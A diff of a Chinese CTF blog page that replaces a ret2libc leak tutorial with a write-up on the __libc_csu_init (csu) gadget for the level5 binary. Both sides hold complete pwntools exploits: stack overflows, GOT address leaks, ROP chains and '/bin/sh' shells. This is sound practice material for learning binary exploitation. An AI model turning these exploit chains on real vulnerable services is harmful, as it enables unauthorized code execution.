@@ -19,24 +19,24 @@
   <meta name="author" content="清风">
   <meta name="keywords" content="">
   
-    <meta name="description" content="原理：在程序运行中，当函数运行过一次之后，会将函数的地址存在got表中，我们可以利用输出函数对函数地址进行泄露 puts64位*题目*  基础检查，只有NX保护 丢入ida  第二个read 明显存在栈溢出 寻找system  发现找不到system 和binsh 也没有flag的字符，初步认为要泄露libc 接下来开始payload的构造 注意64位要用寄存器来传参 用ROR-gadget寻找">
+    <meta name="description" content="csu的利用 原理 64位的动态连接文件一般有一段万能的gadget,里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的) csu在我看来分为两种，一种是通过csu泄露基地址后，跟ret2libc一样调用就可以做出，一">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于ret2libc的泄露">
-<meta property="og:url" content="http://example.com/2024/10/01/libc%E6%B3%84%E9%9C%B2/index.html">
+<meta property="og:title" content="csu利用">
+<meta property="og:url" content="http://example.com/2024/10/01/csu%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="清风不识字">
-<meta property="og:description" content="原理：在程序运行中，当函数运行过一次之后，会将函数的地址存在got表中，我们可以利用输出函数对函数地址进行泄露 puts64位*题目*  基础检查，只有NX保护 丢入ida  第二个read 明显存在栈溢出 寻找system  发现找不到system 和binsh 也没有flag的字符，初步认为要泄露libc 接下来开始payload的构造 注意64位要用寄存器来传参 用ROR-gadget寻找">
+<meta property="og:description" content="csu的利用 原理 64位的动态连接文件一般有一段万能的gadget,里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的) csu在我看来分为两种，一种是通过csu泄露基地址后，跟ret2libc一样调用就可以做出，一">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/123.jpg">
-<meta property="article:published_time" content="2024-10-01T10:20:38.000Z">
-<meta property="article:modified_time" content="2024-10-01T11:12:56.445Z">
+<meta property="og:image" content="http://example.com/img/122.jpg">
+<meta property="article:published_time" content="2024-10-01T11:16:04.000Z">
+<meta property="article:modified_time" content="2024-10-01T11:39:09.339Z">
 <meta property="article:author" content="清风">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/123.jpg">
+<meta name="twitter:image" content="http://example.com/img/122.jpg">
   
   
   
-  <title>关于ret2libc的泄露 - 清风不识字</title>
+  <title>csu利用 - 清风不识字</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="关于ret2libc的泄露"></span>
+            <span id="subtitle" data-typed-text="csu利用"></span>
           
         </div>
 
@@ -214,7 +214,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-01 18:20" pubdate>
+        <time datetime="2024-10-01 19:16" pubdate>
           2024年10月1日 晚上
         </time>
       </span>
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          883 字
+          888 字
         
       </span>
     
@@ -274,92 +274,66 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">关于ret2libc的泄露</h1>
+            <h1 id="seo-header">csu利用</h1>
             
             
               <div class="markdown-body">
                 
-                <p> <strong>原理：在程序运行中，当函数运行过一次之后，会将函数的地址存在got表中，我们可以利用输出函数对函数地址进行泄露</strong></p>
-<h6 id="puts64位"><a href="#puts64位" class="headerlink" title="puts64位"></a><strong>puts64位</strong></h6><p><em><strong>*<a target="_blank" rel="noopener" href="https://download.csdn.net/download/zhuo1358/89068003">题目</a>*</strong></em></p>
-<p><img src="/img/libc/a.png" srcset="/img/loading.gif" lazyload></p>
-<p>基础检查，只有NX保护</p>
+                <h1 id="csu的利用"><a href="#csu的利用" class="headerlink" title="csu的利用"></a>csu的利用</h1><p> <strong>原理</strong></p>
+<p>64位的动态连接文件一般有一段万能的gadget,里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的)</p>
+<p>csu在我看来分为两种，一种是通过csu泄露基地址后，跟ret2libc一样调用就可以做出，一种是往bss段里注入&#x2F;bin&#x2F;sh,通过调用retsyscall来实现，一般第二种较为常见，这篇文章主要详解第二种</p>
+<p>上题 例题是leve5</p>
+<p><img src="/img/csu/a.png" srcset="/img/loading.gif" lazyload></p>
+<p>基础检查，只开了NX保护</p>
 <p>丢入ida</p>
-<p><img src="/img/libc/b.png" srcset="/img/loading.gif" lazyload></p>
-<p>第二个read 明显存在栈溢出</p>
-<p>寻找system</p>
-<p><img src="/img/libc/c.png" srcset="/img/loading.gif" lazyload></p>
-<p>发现找不到system 和binsh</p>
-<p>也没有flag的字符，初步认为要泄露libc</p>
-<p>接下来开始payload的构造</p>
-<p>注意64位要用寄存器来传参</p>
-<p>用ROR-gadget寻找合适的寄存器</p>
-<p><img src="/img/libc/d.png" srcset="/img/loading.gif" lazyload></p>
-<p>泄露出read的真实地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x400823</span>)+p64(read_got)+p64(puts_plt)+p64(main)<br></code></pre></td></tr></table></figure>
+<p><img src="/img/csu/b.png" srcset="/img/loading.gif" lazyload></p>
+<p>存在溢出</p>
+<p>查找一下后门</p>
+<p><img src="/img/csu/c.png" srcset="/img/loading.gif" lazyload></p>
+<p>并没有发现</p>
+<p>初步认为是泄露libc</p>
+<p>我一开始的payload构造是跟普通libc一样</p>
+<p>后面发现</p>
+<p><img src="/img/csu/d.png" srcset="/img/loading.gif" lazyload></p>
+<p>文件缺少可用的寄存器进行传参（64位传参顺序 rdi rsi rdx rcx r8 r9)</p>
+<p> 后面再ida找到了csu函数</p>
+<p><img src="/img/csu/e.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/csu/f.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到上面两端汇编几乎囊括了传参的寄存器，而且还有call指令以及retn,我们可以利用这两段gadget来传参和调用，因为我们要先调用下面一段来传参，所以我们认为下面一段为gadget1,上面一段为gadget2</p>
+<p>这里解释一下cmp rbx,rbp。就是检查rbx-rbp是否为0，与jnz指令配合跳转。所以再传参的时候要将rbx设置为0，rbp为1。</p>
+<p>因此可以定义可以传参函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">r12,r13,r14,r15,last</span>):<br>	payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x400606</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(r12)<br>	payload+=p64(r13)+p64(r14)+p64(r15)+p64(<span class="hljs-number">0x4005f0</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span>+p64(last)<br>	io.send(payload)<br>	sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
 
-<p> 下面是接收数据</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#read=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><br><span class="hljs-comment">#主要使用第一个，第二个有数据干扰</span><br><br><span class="hljs-comment">#第一个的原理是我们的地址都是&#x27;\x7f&#x27;开头的，使用只有遇到&#x27;\x7f&#x27;才会开始接收</span><br></code></pre></td></tr></table></figure>
+<p>传参的顺序按照gadget1的顺序来，其中p64(0),p64(1)分别是rbx和rbp</p>
+<p>上面在调用了gadget1后又填充了a*8，因为寄存器是用sp指针来传参的，所以rsp要正确指向寄存器。</p>
+<p><img src="/img/csu/g.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这里多了var_30的偏移，我们要用gdb查看var_30的大小</p>
+<p>在gadget1下断点运行</p>
+<p><img src="/img/csu/h.png" srcset="/img/loading.gif" lazyload></p>
+<p>layout asm查看汇编代码试图</p>
+<p><img src="/img/csu/i.png" srcset="/img/loading.gif" lazyload></p>
+<p>layout reg 查看寄存器状态</p>
+<p><img src="/img/csu/d.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到又0x8的偏移，所以要填充a*8,不同的libc偏移会不同，具体以调试为准</p>
+<p>在执行完gadget2后，栈顶指针rsp距离retn有0x8*7个偏移(相当于传参6个参数和前面提到的8个垃圾数据，我们只有填充完才能覆盖retn返回main,来进行接下来的操作。</p>
+<p>所以泄露libc的代码为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">csu(write_got,<span class="hljs-number">1</span>,write_got,<span class="hljs-number">8</span>,main)<br>write_real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_real))<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/libc/e.png" srcset="/img/loading.gif" lazyload></p>
-<p>接下俩找libc版本又两种方法</p>
-<p>一个是去下面网站寻找</p>
-<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=read:a50">LibcSearcher</a></p>
-<p><img src="/img/libc/f.png" srcset="/img/loading.gif" lazyload></p>
-<p>另一种方法是安装LibcSearcher的库</p>
-<p>下面是安装教程</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/neuisf/article/details/103829683">LibcSearcher安装</a></p>
-<p>我使用的是第二种方法</p>
-<p>泄露出地址之后开始寻找版本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcher的使用示例</span><br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/libc/g.png" srcset="/img/loading.gif" lazyload></p>
-<p>选择正确的版本</p>
-<p>最后再进行一次溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x40057e</span>)+p64(<span class="hljs-number">0x400823</span>)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure>
-
-<p>这里还要注意栈对齐，要用寄存器多绕一步来维持栈平衡</p>
-<p><img src="/img/libc/h.png" srcset="/img/loading.gif" lazyload></p>
-<p>最后运行</p>
-<p><img src="/img/libc/i.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" srcset="/img/loading.gif" lazyload alt="点击并拖拽以移动"></p>
+<p><img src="/img/csu/k.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到相应的libc 版本(这里不详细描述)</p>
+<p><img src="/img/csu/l.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为在文件里找不到相应的rdi,所以我们选择用retsyscall来利用，retsyscall调用的是exceve函数</p>
+<p>第二次溢出用read 函数将后门函数注入bss段</p>
+<p><img src="/img/csu/m.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/csu/n.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后进行第三次溢出调用retsyscall</p>
+<p><img src="/img/csu/o.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行exp得到shell</p>
+<p><img src="/img/csu/p.png" srcset="/img/loading.gif" lazyload></p>
 <p>最终exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io=process(<span class="hljs-string">&#x27;./libc&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./libc&#x27;</span>)<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>io.recvuntil(<span class="hljs-string">&quot;Hacker,What&#x27;s your name?&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x400823</span>)+p64(read_got)+p64(puts_plt)+p64(main)<br>io.recvuntil(<span class="hljs-string">&quot;then let&#x27;s begin!\n&quot;</span>)<br>io.sendline(payload)<br>read=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the read really address\n&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(read))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>io.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x40057e</span>)+p64(<span class="hljs-number">0x400823</span>)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)<br>io.recvuntil(<span class="hljs-string">&quot;then let&#x27;s begin!\n&quot;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>__libc_start_main_addr=elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">r12,r13,r14,r15,last</span>):<br>	payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x400606</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(r12)<br>	payload+=p64(r13)+p64(r14)+p64(r15)+p64(<span class="hljs-number">0x4005f0</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span>+p64(last)<br>	io.send(payload)<br>	sleep(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>csu(write_got,<span class="hljs-number">1</span>,write_got,<span class="hljs-number">8</span>,main)<br>write_real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_real))<br>base=write_real-<span class="hljs-number">0x0f7af0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>system=base+<span class="hljs-number">0x04c920</span><br>exceve=<span class="hljs-number">0x0d4060</span>+base<br>bss=<span class="hljs-number">0x601028</span><br>csu(read_got,<span class="hljs-number">0</span>,bss,<span class="hljs-number">18</span>,main)<br>io.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>io.sendline(p64(exceve)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>csu(bss,bss+<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,main)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<p>这里提醒一下读者，一定要注意数据的接收顺序来编写recvuntil，笔者在这里卡了好久</p>
-<h6 id="write-32位）"><a href="#write-32位）" class="headerlink" title="write(32位）"></a><strong>write(32位）</strong></h6><p><strong>基础检查</strong></p>
-<p><em><strong>*<a target="_blank" rel="noopener" href="https://download.csdn.net/download/zhuo1358/89059082">题目</a>*</strong></em></p>
-<p><img src="/img/libc/j.png" srcset="/img/loading.gif" lazyload></p>
-<p>基础检查，保护基本没开</p>
-<p>丢入ida</p>
-<p><img src="/img/libc/k.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/img/libc/l.png" srcset="/img/loading.gif" lazyload></p>
-<p>很简单 read 函数存在明显的栈溢出</p>
-<p><img src="/img/libc/m.png" srcset="/img/loading.gif" lazyload></p>
-<p>同样还是找不到system 也没有flag等字符</p>
-<p>初步认为是libc 泄露</p>
-<p>那么可以运用write函数来泄露got表</p>
-<p>在ida中找到返回函数</p>
-<p><img src="/img/libc/n.png" srcset="/img/loading.gif" lazyload></p>
-<p>使用payload1的构造为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write)+p32(<span class="hljs-number">0x80483f4</span>)+p32(<span class="hljs-number">1</span>)+p32(read)+p32(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure>
-
-<p>这里要注意write函数要传入三个参数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t write(<span class="hljs-built_in">int</span> fd,const void*buf,size_t count);<br>参数说明：<br>  fd:是文件描述符（write所对应的是写，即就是<span class="hljs-number">1</span>）<br>  buf:通常是一个字符串，需要写入的字符串<br>  count：是每次写入的字节数<br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/libc/o.png" srcset="/img/loading.gif" lazyload></p>
-<p>地址泄露后开始找libc</p>
-<p>这次我选择用第一种方法</p>
-<p><img src="/img/libc/p.png" srcset="/img/loading.gif" lazyload></p>
-<p>找到对应地址</p>
-<p>开始找算偏移和构造system和binsh 的地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">base=read_got-<span class="hljs-number">0x10a840</span><br>system=base+<span class="hljs-number">0x04c880</span><br>binsh=base+<span class="hljs-number">0x1b5fc8</span><br></code></pre></td></tr></table></figure>
-
-<p>最后再进行一次 栈溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br></code></pre></td></tr></table></figure>
-
-<p>运行exp</p>
-<p><img src="/img/libc/q.png" srcset="/img/loading.gif" lazyload></p>
-<p>最终exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh=process(<span class="hljs-string">&#x27;./123&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./123&#x27;</span>)<br>read=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload =<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write)+p32(<span class="hljs-number">0x80483f4</span>)+p32(<span class="hljs-number">1</span>)+p32(read)+p32(<span class="hljs-number">4</span>)<br>sh.send(payload)<br>read_got=u32(sh.recv())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the read of address :&quot;</span>,<span class="hljs-built_in">hex</span>(read_got))<br><br>base=read_got-<span class="hljs-number">0x10a840</span><br>system=base+<span class="hljs-number">0x04c880</span><br>binsh=base+<span class="hljs-number">0x1b5fc8</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -404,8 +378,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>关于ret2libc的泄露</div>
-      <div>http://example.com/2024/10/01/libc泄露/</div>
+      <div>csu利用</div>
+      <div>http://example.com/2024/10/01/csu利用/</div>
     </div>
     <div class="license-meta">
       
@@ -449,18 +423,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/01/csu%E5%88%A9%E7%94%A8/" title="csu利用">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">csu利用</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="canary的绕过方法">
-                        <span class="hidden-mobile">canary的绕过方法</span>
+                      <a href="/2024/10/01/libc%E6%B3%84%E9%9C%B2/" title="关于ret2libc的泄露">
+                        <span class="hidden-mobile">关于ret2libc的泄露</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
